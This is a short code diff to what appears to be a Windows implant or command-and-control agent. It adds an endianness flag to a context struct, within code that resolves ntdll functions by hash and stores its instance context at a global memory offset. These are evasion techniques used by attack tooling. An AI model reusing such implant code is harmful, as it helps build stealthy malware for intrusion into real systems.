@@ -1,4 +1,5 @@
 #include <core/corelib.hpp>
+#define ENDIANESS 1
 namespace Memory {
 
     VOID ResolveApi() {
@@ -148,6 +149,7 @@ namespace Memory {
         MmAddr = C_PTR(GLOBAL_OFFSET);
         MmSize = sizeof(MmAddr);
 
+
         if (
             !(Instance.Modules.ntdll = LdrGetModuleAddress(NTDLL)) ||
             !(FPTR(Instance.Nt.NtProtectVirtualMemory, Instance.Modules.ntdll, NTPROTECTVIRTUALMEMORY)) ||
@@ -164,6 +166,7 @@ namespace Memory {
             return;
         }
 
+        x_memset(&Instance.LE, ENDIANESS, 1);
         x_memcpy(C_DREF(MmAddr), &Instance, sizeof(HEXANE_CTX));
         x_memset(&Instance, 0, sizeof(HEXANE_CTX));
         x_memset(C_PTR(U_PTR(MmAddr) + sizeof(LPVOID)), 0, 0xE);
